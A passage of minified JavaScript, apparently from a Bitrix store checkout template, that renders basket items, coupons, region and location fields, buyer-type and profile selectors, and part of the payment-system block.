t,s,i=e?this.basketBlockNode:this.basketHiddenBlockNode;this.initialized.basket?(this.basketHiddenBlockNode.appendChild(BX.lastChild(i)),i.appendChild(BX.firstChild(this.basketHiddenBlockNode))):(t=i.querySelector(".bx-soa-section-content"),s=BX.create("TABLE",{props:{className:"bx-soa-item-table"}}),t?BX.cleanNode(t):(t=this.getNewContainer(),i.appendChild(t)),this.editBasketItems(s,!0),t.appendChild(BX.create("DIV",{props:{className:"bx-soa-table-fade"},children:[BX.create("DIV",{style:{overflowX:"auto",overflowY:"hidden"},children:[s]})]})),"Y"===this.params.SHOW_COUPONS_BASKET&&this.editCoupons(t),this.getBlockFooter(t),BX.bind(t.querySelector("div.bx-soa-table-fade").firstChild,"scroll",BX.proxy(this.basketBlockScrollCheckEvent,this))),this.alignBasketColumns()},editFadeBasketBlock:function(e){var t,s,i=e?this.basketHiddenBlockNode:this.basketBlockNode;this.initialized.basket||(t=this.getNewContainer(),s=BX.create("TABLE",{props:{className:"bx-soa-item-table"}}),this.editBasketItems(s,!1),t.appendChild(BX.create("DIV",{props:{className:"bx-soa-table-fade"},children:[BX.create("DIV",{style:{overflowX:"auto",overflowY:"hidden"},children:[s]})]})),"Y"===this.params.SHOW_COUPONS_BASKET&&this.editCoupons(t),i.appendChild(t),this.alignBasketColumns(),this.basketBlockScrollCheck(),BX.bind(this.basketBlockNode.querySelector("div.bx-soa-table-fade").firstChild,"scroll",BX.proxy(this.basketBlockScrollCheckEvent,this))),this.alignBasketColumns()},editBasketItems:function(e,t){if(this.result.GRID.ROWS){var s,i=0;for(s in"Y"===this.params.SHOW_BASKET_HEADERS&&this.editBasketItemsHeader(e),this.result.GRID.ROWS)this.result.GRID.ROWS.hasOwnProperty(s)&&this.createBasketItem(e,this.result.GRID.ROWS[s],i++,!!t)}},editBasketItemsHeader:function(e){if(e){var t,s,i=[BX.create("TD",{props:{className:"bx-soa-item-td"},style:{paddingBottom:"5px"},children:[BX.create("DIV",{props:{className:"bx-soa-item-td-title"},text:BX.message("SOA_SUM_NAME")})]})],o=!1,a=0;for(s=0;s<this.result.GRID.HEADERS.length;s++)"NAME"!==(t=this.result.GRID.HEADERS[s]).id&&"PREVIEW_PICTURE"!==t.id&&"PROPS"!==t.id&&"NOTES"!==t.id&&("DETAIL_PICTURE"!==t.id||this.options.showPreviewPicInBasket)&&(o=BX.util.in_array(t.id,["QUANTITY","PRICE_FORMATED","DISCOUNT_PRICE_PERCENT_FORMATED","SUM"]),i.push(BX.create("TD",{props:{className:"bx-soa-item-td bx-soa-item-properties"+(o?" bx-text-right":"")},style:{paddingBottom:"5px"},children:[BX.create("DIV",{props:{className:"bx-soa-item-td-title"},text:t.name})]})),4==++a&&this.result.GRID.HEADERS[s+1]&&(i.push(BX.create("DIV",{props:{className:"bx-soa-item-nth-4p1"}})),a=0));e.appendChild(BX.create("TR",{props:{className:"bx-soa-item-tr hidden-sm hidden-xs"},children:i}))}},createBasketItem:function(e,t,s,i){var o,a,r,l,n=[],c=[],p=[],h=0,d=0,u=0;for((this.options.showPreviewPicInBasket||this.options.showDetailPicInBasket)&&n.push(this.createBasketItemImg(t.data)),n.push(this.createBasketItemContent(t.data)),a=0;a<this.result.GRID.HEADERS.length;a++)"NAME"!==(o=this.result.GRID.HEADERS[a]).id&&"PREVIEW_PICTURE"!==o.id&&"PROPS"!==o.id&&"NOTES"!==o.id&&("DETAIL_PICTURE"!==o.id||this.options.showPreviewPicInBasket)&&(c.push(this.createBasketItemColumn(o,t,i)),4==++h&&this.result.GRID.HEADERS[a+1]&&(c.push(BX.create("DIV",{props:{className:"bx-soa-item-nth-4p1"}})),h=0,d++),u++);if(i)for(a=0;a<this.result.GRID.HEADERS_HIDDEN.length;a++)r=this.createBasketItemHiddenColumn(this.result.GRID.HEADERS_HIDDEN[a],t),BX.type.isArray(r)?p=p.concat(r):r&&p.push(r);l=[BX.create("TD",{props:{className:"bx-soa-item-td"},style:{minWidth:"300px"},children:[BX.create("DIV",{props:{className:"bx-soa-item-block"},children:n})]})].concat(c);var m="",B=void 0!==t.data.LINK_SERVICES&&t.data.LINK_SERVICES.constructor===Object;"Y"===t.data.IS_SERVICES&&(m+=" hidden_order_services "),B&&(m+=" w_order_services "),e.appendChild(BX.create("TR",{props:{className:"bx-soa-item-tr bx-soa-basket-info"+m+(0==s?" bx-soa-item-tr-first":"")},children:l}));u=d+u+1,B&&(this.createServicesBasketItem(t,u).forEach((function(t,s,i){e.append(t)})),e.appendChild(BX.create("TR",{props:{className:"services-item-tr-padding"},children:[BX.create("TD",{props:{className:"services-item-td-padding"},attrs:{colspan:u},text:""})]}))),p.length&&e.appendChild(BX.create("TR",{props:{className:"bx-soa-item-tr bx-soa-item-info-container"+m},children:[BX.create("TD",{props:{className:"bx-soa-item-td"},attrs:{colspan:u},children:[BX.create("A",{props:{href:"",className:"bx-soa-info-shower"},html:this.params.MESS_ADDITIONAL_PROPS,events:{click:BX.proxy(this.showAdditionalProperties,this)}}),BX.create("DIV",{props:{className:"bx-soa-item-info-block"},children:[BX.create("TABLE",{props:{className:"bx-soa-info-block"},children:p})]})]})]}))},showAdditionalProperties:function(e){var t=e.target||e.srcElement,s=t.nextSibling,i=BX.findParent(t,{className:"bx-soa-item-tr bx-soa-item-info-container"}),o=i.offsetHeight;if(BX.hasClass(s,"bx-active"))new BX.easing({duration:300,start:{opacity:100,height:o},finish:{opacity:0,height:35},transition:BX.easing.makeEaseOut(BX.easing.transitions.quad),step:function(e){s.style.opacity=e.opacity/100,s.style.height=e.height+"px",i.style.height=e.height+"px"},complete:function(){BX.removeClass(s,"bx-active"),s.removeAttribute("style"),i.removeAttribute("style")}}).animate();else{s.style.opacity=0,BX.addClass(s,"bx-active");var a=s.offsetHeight+o;BX.removeClass(s,"bx-active"),s.style.paddingTop="10px",new BX.easing({duration:300,start:{opacity:0,height:o},finish:{opacity:100,height:a},transition:BX.easing.makeEaseOut(BX.easing.transitions.quad),step:function(e){s.style.opacity=e.opacity/100,s.style.height=e.height+"px",i.style.height=e.height+"px"},complete:function(){BX.addClass(s,"bx-active"),s.removeAttribute("style")}}).animate()}return BX.PreventDefault(e)},createBasketItemImg:function(e){var t,s;if(e)return t=BX.create("DIV",{props:{className:"bx-soa-item-imgcontainer"}}),e.PREVIEW_PICTURE_SRC&&e.PREVIEW_PICTURE_SRC.length?s=this.getImageSources(e,"PREVIEW_PICTURE"):e.DETAIL_PICTURE_SRC&&e.DETAIL_PICTURE_SRC.length&&(s=this.getImageSources(e,"DETAIL_PICTURE")),s&&s.src_2x?t.setAttribute("style","background-image: url("+s.src_1x+");background-image: -webkit-image-set(url("+s.src_1x+") 1x, url("+s.src_2x+") 2x)"):(s=s&&s.src_1x||this.defaultBasketItemLogo,t.setAttribute("style","background-image: url("+s+");")),"Y"!==this.params.HIDE_DETAIL_PAGE_URL&&e.DETAIL_PAGE_URL&&e.DETAIL_PAGE_URL.length&&(t=BX.create("A",{props:{href:e.DETAIL_PAGE_URL},children:[t]})),BX.create("DIV",{props:{className:"bx-soa-item-img-block"},children:[t]})},createBasketItemContent:function(e){var t=e.NAME||"",s=this.htmlspecialcharsEx(t),i=e.PROPS||[],o=[];if("Y"!==this.params.HIDE_DETAIL_PAGE_URL&&e.DETAIL_PAGE_URL&&e.DETAIL_PAGE_URL.length&&(s='<a href="'+e.DETAIL_PAGE_URL+'">'+s+"</a>"),this.options.showPropsInBasket&&i.length)for(var a in i)if(i.hasOwnProperty(a)){var r=i[a].NAME||"",l=i[a].VALUE||"";o.push(BX.create("DIV",{props:{className:"bx-soa-item-td-title"},style:{textAlign:"left"},text:r})),o.push(BX.create("DIV",{props:{className:"bx-soa-item-td-text"},style:{textAlign:"left"},text:l}))}return BX.create("DIV",{props:{className:"bx-soa-item-content"},children:o.length?[BX.create("DIV",{props:{className:"bx-soa-item-title"},html:s}),BX.create("DIV",{props:{className:"bx-scu-container"},children:o})]:[BX.create("DIV",{props:{className:"bx-soa-item-title"},html:s})]})},createServicesBasketItem:function(e,t){var s=e.data.LINK_SERVICES,i=[],o=this.options.showPreviewPicInBasket||this.options.showDetailPicInBasket?" need_img_padding ":"";for(var a in s){var r=[BX.create("SPAN",{props:{className:"services_order_item_title"},html:s[a].NAME}),BX.create("SPAN",{props:{className:"services_order_item_x"},html:" x "}),BX.create("SPAN",{props:{className:"services_order_item_quantity"},html:s[a].QUANTITY+"&nbsp;"+s[a].MEASURE_TEXT})],l=[BX.create("SPAN",{props:{className:"price font-bold"},html:s[a].SUM_FORMATED})];"Y"===s[a].NEED_SHOW_OLD_SUM&&l.push(BX.create("SPAN",{props:{className:"price_discount"},html:s[a].SUM_BASE_FORMATED})),i.push(BX.create("TR",{props:{className:"services_order_item "+o},children:[BX.create("TD",{props:{className:"services_order_item_info"},attrs:{colspan:t-1},children:[BX.create("DIV",{props:{className:"services_order_item_info_inner"},children:r})]}),BX.create("TD",{props:{className:"services_order_item_price"},children:l})]}))}return i},createBasketItemColumn:function(e,t,s){if(e&&t){var i,o,a=t.columns[e.id]?t.columns:t.data,r=BX.util.in_array(e.id,["QUANTITY","PRICE_FORMATED","DISCOUNT_PRICE_PERCENT_FORMATED","SUM"]),l=BX.create("DIV",{props:{className:"bx-soa-item-td-text"}});if("PRICE_FORMATED"===e.id)l.appendChild(BX.create("STRONG",{props:{className:"bx-price"},html:a.PRICE_FORMATED})),parseFloat(a.DISCOUNT_PRICE)>0&&(l.appendChild(BX.create("BR")),l.appendChild(BX.create("STRONG",{props:{className:"bx-price-old"},html:a.BASE_PRICE_FORMATED}))),this.options.showPriceNotesInBasket&&s&&(l.appendChild(BX.create("BR")),l.appendChild(BX.create("SMALL",{text:a.NOTES})));else if("SUM"===e.id)l.appendChild(BX.create("STRONG",{props:{className:"bx-price all"},html:a.SUM})),parseFloat(a.DISCOUNT_PRICE)>0&&(l.appendChild(BX.create("BR")),l.appendChild(BX.create("STRONG",{props:{className:"bx-price-old"},html:a.SUM_BASE_FORMATED})));else if("DISCOUNT"===e.id)l.appendChild(BX.create("STRONG",{props:{className:"bx-price"},text:a.DISCOUNT_PRICE_PERCENT_FORMATED}));else if("DETAIL_PICTURE"===e.id)i=this.getImageSources(t.data,e.id),o=BX.create("IMG",{props:{src:i&&i.src_1x||this.defaultBasketItemLogo}}),i&&i.src_1x&&i.src_orig&&BX.bind(o,"click",BX.delegate((function(e){this.popupShow(e,i.src_orig)}),this)),l.appendChild(o);else if(BX.util.in_array(e.id,["QUANTITY","WEIGHT_FORMATED","DISCOUNT_PRICE_PERCENT_FORMATED"]))l.appendChild(BX.create("SPAN",{html:a[e.id]}));else if("PREVIEW_TEXT"===e.id)"html"===a.PREVIEW_TEXT_TYPE?l.appendChild(BX.create("SPAN",{html:a.PREVIEW_TEXT||""})):l.appendChild(BX.create("SPAN",{text:a.PREVIEW_TEXT||""}));else{var n=a[e.id],c=[];if(BX.type.isArray(n)){for(var p in n)n.hasOwnProperty(p)&&("image"==n[p].type?c.push(this.getImageContainer(n[p].value,n[p].source)):"linked"==n[p].type?(l.appendChild(BX.create("SPAN",{html:n[p].value_format})),l.appendChild(BX.create("BR"))):n[p].value&&(l.appendChild(BX.create("SPAN",{html:n[p].value})),l.appendChild(BX.create("BR"))));c.length&&l.appendChild(BX.create("DIV",{props:{className:"bx-scu-list"},children:[BX.create("UL",{props:{className:"bx-scu-itemlist"},children:c})]}))}else n&&l.appendChild(BX.create("SPAN",{html:BX.util.htmlspecialchars(n)}))}return BX.create("TD",{props:{className:"bx-soa-item-td bx-soa-item-properties"+(r?" bx-text-right":"")},children:[BX.create("DIV",{props:{className:"bx-soa-item-td-title visible-xs visible-sm"},text:e.name}),l]})}},createBasketItemHiddenColumn:function(e,t){if(e&&t){var s,i,o,a=t.columns[e.id]?t.columns:t.data,r=BX.create("TD",{props:{className:"bx-soa-info-text"}});if("PROPS"!==e.id){if("PRICE_FORMATED"===e.id)r.appendChild(BX.create("STRONG",{props:{className:"bx-price"},html:a.PRICE_FORMATED})),parseFloat(a.DISCOUNT_PRICE)>0&&(r.appendChild(BX.create("BR")),r.appendChild(BX.create("STRONG",{props:{className:"bx-price-old"},html:a.BASE_PRICE_FORMATED})));else if("SUM"===e.id)r.appendChild(BX.create("STRONG",{props:{className:"bx-price all"},text:a.SUM}));else if("DISCOUNT"===e.id)r.appendChild(BX.create("STRONG",{props:{className:"bx-price"},text:a.DISCOUNT_PRICE_PERCENT_FORMATED}));else if("DETAIL_PICTURE"===e.id||"PREVIEW_PICTURE"===e.id)s=this.getImageSources(t.data,e.id),i=BX.create("IMG",{props:{src:s&&s.src_1x||this.defaultBasketItemLogo},style:{maxWidth:"50%"}}),s&&s.src_1x&&s.src_orig&&BX.bind(i,"click",BX.delegate((function(e){this.popupShow(e,s.src_orig)}),this)),r.appendChild(i);else if(BX.util.in_array(e.id,["QUANTITY","WEIGHT_FORMATED","DISCOUNT_PRICE_PERCENT_FORMATED"]))r.appendChild(BX.create("SPAN",{html:a[e.id]}));else if("PREVIEW_TEXT"===e.id)"html"===a.PREVIEW_TEXT_TYPE?r.appendChild(BX.create("SPAN",{html:a.PREVIEW_TEXT||""})):r.appendChild(BX.create("SPAN",{text:a.PREVIEW_TEXT||""}));else{var l=a[e.id],n=[];if(BX.type.isArray(l)){for(o in l)if(l.hasOwnProperty(o))if("image"==l[o].type)n.push(this.getImageContainer(l[o].value,l[o].source));else if("linked"==l[o].type)r.appendChild(BX.create("SPAN",{html:l[o].value_format})),r.appendChild(BX.create("BR"));else{if(!l[o].value)return;r.appendChild(BX.create("SPAN",{html:l[o].value})),r.appendChild(BX.create("BR"))}n.length&&r.appendChild(BX.create("DIV",{props:{className:"bx-scu-list"},children:[BX.create("UL",{props:{className:"bx-scu-itemlist"},children:n})]}))}else{if(!l)return;r.appendChild(BX.create("SPAN",{html:BX.util.htmlspecialchars(l)}))}}return BX.create("TR",{props:{className:"bx-soa-info-line"},children:[BX.create("TD",{props:{className:"bx-soa-info-title"},text:e.name+":"}),r]})}var c=[],p=t.data.PROPS;if(p&&p.length){for(o in p)if(p.hasOwnProperty(o)){var h=p[o].NAME||"",d=p[o].VALUE||"";if(0==d.length)continue;c.push(BX.create("TR",{props:{className:"bx-soa-info-line"},children:[BX.create("TD",{props:{className:"bx-soa-info-title"},text:h+":"}),BX.create("TD",{props:{className:"bx-soa-info-text"},html:BX.util.htmlspecialchars(d)})]}))}return c}}},popupShow:function(e,t,s){this.popup&&this.popup.destroy();var i=this;this.popup=new BX.PopupWindow("bx-soa-image-popup",null,{lightShadow:!0,offsetTop:0,offsetLeft:0,closeIcon:{top:"3px",right:"10px"},autoHide:!0,bindOptions:{position:"bottom"},closeByEsc:!0,zIndex:100,events:{onPopupShow:function(){BX.create("IMG",{props:{src:s||t},events:{load:function(){var e=BX("bx-soa-image-popup-content");if(e){var t,s,o=BX.GetWindowInnerSize(),a=this.isMobile?.5:.9;BX.cleanNode(e),e.appendChild(this),t=e.offsetHeight,s=e.offsetWidth,t>o.innerHeight*a&&(e.style.height=o.innerHeight*a+"px",e.style.width=s*(o.innerHeight*a/t)+"px",t=e.offsetHeight,s=e.offsetWidth),s>o.innerWidth*a&&(e.style.width=o.innerWidth*a+"px",e.style.height=t*(o.innerWidth*a/s)+"px"),e.style.height=e.offsetHeight+"px",e.style.width=e.offsetWidth+"px",i.popup.adjustPosition()}}}})},onPopupClose:function(){this.destroy()}},content:BX.create("DIV",{props:{id:"bx-soa-image-popup-content"},children:[BX.create("IMG",{props:{src:this.templateFolder+"/images/loader.gif"}})]})}),this.popup.show()},getImageContainer:function(e,t){return BX.create("LI",{props:{className:"bx-img-item"},children:[BX.create("DIV",{props:{className:"bx-scu-itemColorBlock"},children:[BX.create("DIV",{props:{className:"bx-img-itemColor"},style:{backgroundImage:"url("+e+")"}})],events:{click:BX.delegate((function(s){this.popupShow(s,e,t)}),this)}})]})},editCoupons:function(e){var t=this.getCouponsList(!0),s=(this.getCouponsLabel(!0),BX.create("DIV",{props:{className:"bx-soa-coupon-block"},children:[BX.create("DIV",{props:{className:"bx-soa-coupon-input"},children:[BX.create("INPUT",{props:{className:"form-control bx-ios-fix",type:"text",placeholder:BX.message("ORDER_PROMOCODE_TITLE")},events:{change:BX.delegate((function(e){var t=BX.getEventTarget(e);t&&t.value&&(this.sendRequest("enterCoupon",t.value),t.value="")}),this)}})]}),BX.create("SPAN",{props:{className:"bx-soa-coupon-item"},children:t})]}));e.appendChild(BX.create("DIV",{props:{className:"bx-soa-coupon"},children:[s]}))},editCouponsFade:function(e){if(!(this.result.COUPON_LIST.length<1)){var t,s,i=this.getCouponsList(!1);i.length&&(t=this.getCouponsLabel(!1),s=BX.create("DIV",{props:{className:"bx-soa-coupon-block"},children:[BX.create("DIV",{props:{className:"bx-soa-coupon-list"},children:[BX.create("DIV",{props:{className:"bx-soa-coupon-item"},children:[t].concat(i)})]})]}),e.appendChild(BX.create("DIV",{props:{className:"bx-soa-coupon bx-soa-coupon-item-fixed"},children:[s]})))}},getCouponsList:function(e){var t,s=[];for(t=0;t<this.result.COUPON_LIST.length;t++)(e||!e&&"APPLIED"==this.result.COUPON_LIST[t].JS_STATUS)&&s.push(this.getCouponNode({text:this.result.COUPON_LIST[t].COUPON,desc:this.result.COUPON_LIST[t].JS_CHECK_CODE,status:this.result.COUPON_LIST[t].JS_STATUS},e));return s},getCouponNode:function(e,t){var s,i,o=BX.util.htmlspecialchars(e.text)||"",a=e.desc&&e.desc.length?e.desc.charAt(0).toUpperCase()+e.desc.slice(1):BX.message("SOA_NOT_FOUND");switch((e.status||"BAD").toUpperCase()){case"ENTERED":s="used",i="warning";break;case"BAD":s=i="danger";break;default:s=i="success"}return BX.create("STRONG",{attrs:{"data-coupon":o,className:"bx-soa-coupon-item-"+s},children:t?[BX.create("SPAN",{props:{className:"bx-soa-coupon-item__text"},text:o||""}),BX.create("SPAN",{props:{className:"bx-soa-tooltip bx-soa-tooltip-coupon bx-soa-tooltip-"+i+" tooltip top"},children:[BX.create("SPAN",{props:{className:"bx-soa-coupon-remove"},events:{click:BX.delegate((function(e){var t=e.target||e.srcElement,s=BX.findParent(t,{tagName:"STRONG"});s&&s.getAttribute("data-coupon")&&this.sendRequest("removeCoupon",s.getAttribute("data-coupon"))}),this)}}),BX.create("SPAN",{props:{className:"tooltip-arrow"}}),BX.create("SPAN",{props:{className:"tooltip-inner"},text:a})]})]:[o]})},getCouponsLabel:function(e){return BX.create("DIV",{props:{className:"bx-soa-coupon-label"},children:e?[BX.create("LABEL",{html:this.params.MESS_USE_COUPON+":"})]:[this.params.MESS_COUPON+":"]})},addCoupon:function(e){for(var t=this.orderBlockNode.querySelectorAll(".bx-soa-coupon:not(.bx-soa-coupon-item-fixed) .bx-soa-coupon-item"),s=0;s<t.length&&!t[s].querySelector('[data-coupon="'+BX.util.htmlspecialchars(e)+'"]');s++)t[s].appendChild(this.getCouponNode({text:e},!0,"bx-soa-coupon-item-danger"))},removeCoupon:function(e){var t,s=this.orderBlockNode.querySelectorAll('[data-coupon="'+BX.util.htmlspecialchars(e)+'"]');for(t in s)s.hasOwnProperty(t)&&BX.remove(s[t])},editRegionBlock:function(e){this.regionBlockNode&&this.regionHiddenBlockNode&&this.result.PERSON_TYPE&&(e?(this.editActiveRegionBlock(!0),!this.regionBlockNotEmpty&&this.editFadeRegionBlock()):this.editFadeRegionBlock(),this.initialized.region=!0)},editActiveRegionBlock:function(e){var t,s,i,o=e?this.regionBlockNode:this.regionHiddenBlockNode;this.initialized.region||((t=o.querySelector(".bx-soa-section-content"))?BX.cleanNode(t):(t=this.getNewContainer(),o.appendChild(t)),this.getErrorContainer(t),s=BX.create("DIV",{props:{className:"bx_soa_location row"}}),i=BX.create("DIV",{props:{className:"col-xs-12"}}),this.getProfilesControl(i),this.result.SHOW_AUTH||(this.regionBlockNotEmpty?(BX.addClass(this.regionBlockNode,"bx-active"),this.regionBlockNode.style.display=""):(BX.removeClass(this.regionBlockNode,"bx-active"),this.regionBlockNode.style.display="none",this.result.IS_AUTHORIZED&&void 0===this.result.LAST_ORDER_DATA.FAIL||this.initFirstSection())),s.appendChild(i),t.appendChild(s),this.getBlockFooter(t))},editFadeRegionBlock:function(){var e;this.regionBlockNode.querySelector(".bx-soa-section-content");this.initialized.region||(this.editActiveRegionBlock(!1),BX.remove(BX.lastChild(this.regionBlockNode))),e=this.getNewContainer(!0),this.regionBlockNode.appendChild(e),this.editFadeRegionContent(e)},editFadeRegionContent:function(e){if(e&&this.locationsInitialized){this.getSelectedPersonType();var t=this.regionHiddenBlockNode.querySelector(".alert.alert-danger");t&&e.appendChild(t.cloneNode(!0)),"true"==this.regionBlockNode.getAttribute("data-visited")&&(this.isValidRegionBlock().length?BX.addClass(this.regionBlockNode,"bx-step-error"):BX.removeClass(this.regionBlockNode,"bx-step-error"))}},getSelectedPersonType:function(){var e,t,s,i,o=this.result.PERSON_TYPE.length;if(e=1==o?this.propsBlockNode.querySelector("input[type=hidden][name=PERSON_TYPE]"):2==o?this.propsBlockNode.querySelector("input[type=radio][name=PERSON_TYPE]:checked"):this.propsBlockNode.querySelector("select[name=PERSON_TYPE] > option:checked"))for(i in s=e.value,this.result.PERSON_TYPE)if(this.result.PERSON_TYPE[i].ID==s){t=this.result.PERSON_TYPE[i];break}return t},getDeliveryLocationInput:function(e){var t,s,i,o,a,r,l,n,c,p,h,d;for(a in this.result.ORDER_PROP.properties)if(this.result.ORDER_PROP.properties.hasOwnProperty(a)&&"Y"==(t=this.result.ORDER_PROP.properties[a]).IS_LOCATION){s=t.ID,i=parseInt(t.INPUT_FIELD_LOCATION);break}if((o=this.locations[s])&&o[0]&&o[0].output)for(a in this.regionBlockNotEmpty=!0,'<label class="bx-soa-custom-label" for="soa-property-'+parseInt(s)+'">'+("Y"==t.REQUIRED?'<span class="bx-authform-starrequired">*</span> ':"")+BX.util.htmlspecialchars(t.NAME)+(t.DESCRIPTION.length?" <small>("+BX.util.htmlspecialchars(t.DESCRIPTION)+")</small>":"")+"</label>",l=o[0].output,n=BX.create("DIV",{attrs:{"data-property-id-row":s},props:{className:"form-group bx-soa-location-input-container soa-property-container"},style:{visibility:"hidden"},html:l.HTML}),e.appendChild(n),e.appendChild(BX.create("INPUT",{props:{type:"hidden",name:"RECENT_DELIVERY_VALUE",value:o[0].lastValue}})),l.SCRIPT)l.SCRIPT.hasOwnProperty(a)&&BX.evalGlobal(l.SCRIPT[a].JS);if(o&&o[0]&&o[0].showAlt&&i>0)for(a in this.result.ORDER_PROP.properties)if(parseInt(this.result.ORDER_PROP.properties[a].ID)==i){r=this.result.ORDER_PROP.properties[a];break}r&&(d=BX.create("DIV",{attrs:{"data-property-id-row":r.ID},props:{className:"form-group bx-soa-location-input-container"}}),c=BX.util.htmlspecialchars(r.NAME),c+="Y"==r.REQUIRED?'<span class="bx-authform-starrequired">*</span> ':"",p=BX.create("LABEL",{attrs:{for:"altProperty"},props:{className:"bx-soa-custom-label"},html:c}),h=BX.create("INPUT",{props:{id:"altProperty",type:"text",placeholder:r.DESCRIPTION,autocomplete:"city",className:"form-control bx-soa-customer-input bx-ios-fix",name:"ORDER_PROP_"+r.ID,value:r.VALUE}}),d.appendChild(p),d.appendChild(h),e.appendChild(d),this.bindValidation(r.ID,d)),o&&o[0]&&e.appendChild(BX.create("DIV",{props:{className:"bx-soa-reference"},html:this.params.MESS_REGION_REFERENCE}))},getLocationString:function(e){if(!e)return"";var t,s,i,o=e.querySelector(".bx-ui-sls-route"),a="";if(o&&o.value&&o.value.length)a=o.value;else{for(s=(t=e.querySelectorAll(".bx-ui-combobox-fake.bx-combobox-fake-as-input")).length;s--;)t[s].innerHTML.indexOf("...")>=0||(t[s].innerHTML.indexOf("---")>=0?(i=BX("altProperty"))&&i.value.length&&(a+=i.value):(a.length&&(a+=", "),a+=t[s].innerHTML));0==a.length&&(a=BX.message("SOA_NOT_SPECIFIED"))}return a},getZipLocationInput:function(e){var t,s,i,o,a,r;for(s in this.result.ORDER_PROP.properties)if(this.result.ORDER_PROP.properties.hasOwnProperty(s)&&"Y"==this.result.ORDER_PROP.properties[s].IS_ZIP){t=this.result.ORDER_PROP.properties[s];break}if(t){this.regionBlockNotEmpty=!0,(i=BX.create("DIV",{props:{className:"form-group bx-soa-location-input-container"}})).setAttribute("data-property-id-row",t.ID),o=BX.util.htmlspecialchars(t.NAME),o+="Y"==t.REQUIRED?'<span class="bx-authform-starrequired">*</span> ':"",a=BX.create("LABEL",{attrs:{for:"zipProperty"},props:{className:"bx-soa-custom-label"},html:o}),r=BX.create("INPUT",{props:{id:"zipProperty",type:"text",placeholder:t.DESCRIPTION,autocomplete:"zip",className:"form-control bx-soa-customer-input bx-ios-fix",name:"ORDER_PROP_"+t.ID,value:t.VALUE}}),i.appendChild(a),i.appendChild(r);const s=BX.create("DIV",{props:{className:"bx-soa-pp-company-item group-without-margin"},children:[i,BX.create("input",{props:{id:"ZIP_PROPERTY_CHANGED",name:"ZIP_PROPERTY_CHANGED",type:"hidden",value:this.result.ZIP_PROPERTY_CHANGED||"N"}})]}),l=BX.create("DIV",{props:{className:"col-md-12"},children:[s]});e.appendChild(l),this.bindValidation(t.ID,i)}},getPersonTypeSortedArray:function(e){var t,s=[];for(t in e)e.hasOwnProperty(t)&&s.push(e[t]);return s.sort((function(e,t){return parseInt(e.SORT)-parseInt(t.SORT)}))},getPersonTypeControl:function(e){if(this.result.PERSON_TYPE){this.result.PERSON_TYPE=this.getPersonTypeSortedArray(this.result.PERSON_TYPE);var t,s,i,o,a=this.result.PERSON_TYPE.length,r=[];if(a>2){for(i in this.result.PERSON_TYPE)this.result.PERSON_TYPE.hasOwnProperty(i)&&(t=this.result.PERSON_TYPE[i],r.push(BX.create("OPTION",{props:{value:t.ID,selected:"Y"==t.CHECKED},text:t.NAME})),"Y"==t.CHECKED&&(s=t.ID));e.appendChild(BX.create("SELECT",{props:{name:"PERSON_TYPE",className:"form-control"},children:r,events:{change:BX.proxy(this.sendRequest,this)}})),this.regionBlockNotEmpty=!0}else if(2==a){for(i in this.result.PERSON_TYPE)this.result.PERSON_TYPE.hasOwnProperty(i)&&(t=this.result.PERSON_TYPE[i],o=BX.create("LABEL",{children:[BX.create("INPUT",{attrs:{checked:"Y"==t.CHECKED},props:{type:"radio",name:"PERSON_TYPE",value:t.ID}}),BX.util.htmlspecialchars(t.NAME)],events:{change:BX.proxy(this.sendRequest,this)}}),e.appendChild(BX.create("DIV",{props:{className:"person-type"+("Y"==t.CHECKED?" active":"")},children:[o]})),"Y"==t.CHECKED&&(s=t.ID));this.regionBlockNotEmpty=!0}else for(i in this.result.PERSON_TYPE)this.result.PERSON_TYPE.hasOwnProperty(i)&&e.appendChild(BX.create("INPUT",{props:{type:"hidden",name:"PERSON_TYPE",value:this.result.PERSON_TYPE[i].ID}}));s&&e.appendChild(BX.create("INPUT",{props:{type:"hidden",name:"PERSON_TYPE_OLD",value:s}}))}},getProfilesControl:function(e){var t,s,i,o,a=BX.util.object_keys(this.result.USER_PROFILES).length,r=[];if(a)if("Y"===this.params.ALLOW_USER_PROFILES&&(a>1||"Y"===this.params.ALLOW_NEW_PROFILE)){for(t in this.regionBlockNotEmpty=!0,s=BX.create("LABEL",{props:{className:"bx-soa-custom-label"},html:this.params.MESS_SELECT_PROFILE}),this.result.USER_PROFILES)this.result.USER_PROFILES.hasOwnProperty(t)&&r.unshift(BX.create("OPTION",{props:{value:this.result.USER_PROFILES[t].ID,selected:"Y"===this.result.USER_PROFILES[t].CHECKED},html:this.result.USER_PROFILES[t].NAME}));"Y"===this.params.ALLOW_NEW_PROFILE&&r.unshift(BX.create("OPTION",{props:{value:0},text:BX.message("SOA_PROP_NEW_PROFILE")})),i=BX.create("INPUT",{props:{type:"hidden",value:"N",id:"profile_change",name:"profile_change"}}),o=BX.create("SELECT",{props:{className:"form-control",name:"PROFILE_ID"},children:r,events:{change:BX.delegate((function(){BX("profile_change").value="Y",this.sendRequest()}),this)}}),e.appendChild(BX.create("DIV",{props:{className:"form-group bx-soa-location-input-container"},children:[s,i,o]}))}else for(t in this.result.USER_PROFILES)this.result.USER_PROFILES.hasOwnProperty(t)&&"Y"===this.result.USER_PROFILES[t].CHECKED&&e.appendChild(BX.create("INPUT",{props:{name:"PROFILE_ID",type:"hidden",value:this.result.USER_PROFILES[t].ID}}))},editPaySystemBlock:function(e){this.paySystemBlockNode&&this.paySystemHiddenBlockNode&&this.result.PAY_SYSTEM&&(this.editActivePaySystemBlock(e),this.initialized.paySystem=!0)},editActivePaySystemBlock:function(e){var t,s,i=e?this.paySystemBlockNode:this.paySystemHiddenBlockNode;1===this.result.PAY_SYSTEM.length?this.paySystemBlockNode.classList.add("hidden"):this.paySystemBlockNode.classList.remove("hidden"),this.initialized.paySystem||(this.opened["bx-soa-paysystem"]||this.paySystemBlockNode.classList.add("bx-step-completed"),(t=i.querySelector(".bx-soa-section-content"))?BX.cleanNode(t):(t=this.getNewContainer(),i.appendChild(t)),this.getErrorContainer(t),s=BX.create("DIV",{props:{className:"bx-soa-pp row"}}),this.editPaySystemItems(s),t.appendChild(s),this.editPaySystemInfo(s),this.getBlockFooter(t)),e&&this.initialized.paySystem||this.getPaySystemCompactInfo()},getPaySystemCompactInfo:function(){BX.remove(BX.lastChild(this.paySystemBlockNode.querySelector(".bx-compact-wrapper")));let e=this.getSelectedPaySystem();if(e){const t=[],s=BX.create("div",{props:{className:"bx-compact-title"},html:e.NAME});if(t.push(s),"Y"==this.params.SHOW_IMAGES){const s=this.getImageNode(e,"PAY_SYSTEM");t.push(s)}const 